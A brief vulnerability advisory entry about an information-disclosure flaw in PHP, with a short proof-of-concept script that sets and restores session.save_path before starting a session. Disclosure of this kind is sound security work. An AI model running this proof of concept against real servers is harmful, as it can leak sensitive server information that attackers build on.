source: http://www.securityfocus.com/bid/36009/info

PHP is prone to an information-disclosure vulnerability.

Attackers can exploit this issue to obtain sensitive information that may lead to further attacks. 

<?php

ini_set("session.save_path", "0123456789ABCDEF");
ini_restore("session.save_path");
session_start();
?>